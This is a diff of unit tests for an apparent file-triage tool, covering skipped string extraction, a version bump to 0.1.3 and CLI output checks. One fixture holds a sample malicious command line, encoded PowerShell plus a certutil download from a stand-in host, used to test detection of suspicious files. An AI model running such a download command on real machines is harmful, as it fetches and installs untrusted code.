@@ -385,6 +385,7 @@ class TestTriageOne(unittest.TestCase):
         p = write_temp("b.txt", "http://a.example.com")
         rec = yt.triage_one(p, no_strings=True)
         self.assertEqual(rec["strings"]["count"], 0)
+        self.assertTrue(rec["strings"]["skipped"])
 
     def test_pe_record(self):
         p = write_temp("x.exe", make_pe())
@@ -440,7 +441,7 @@ class TestCLI(unittest.TestCase):
     def test_version(self):
         r = run_cli("--version")
         self.assertEqual(r.returncode, 0)
-        self.assertIn("0.1.2", r.stdout)
+        self.assertIn("0.1.3", r.stdout)
 
     def test_no_args_exit4(self):
         r = run_cli()
@@ -460,6 +461,13 @@ class TestCLI(unittest.TestCase):
         r = run_cli("triage", "--path", p)
         self.assertEqual(r.returncode, 0)
         self.assertIn("SHA256", r.stdout)
+
+    def test_no_strings_text_marks_skipped(self):
+        p = write_temp("skip-strings.txt", "http://a.example.com")
+        r = run_cli("triage", "--path", p, "--no-strings")
+        self.assertEqual(r.returncode, 0)
+        self.assertIn("字符串: 已跳过", r.stdout)
+        self.assertNotIn("字符串: 0 条", r.stdout)
 
     def test_suspicious_file_exit1(self):
         p = write_temp("bad.txt", "powershell -enc AAAA certutil -urlcache -f http://evil.example.com/x")
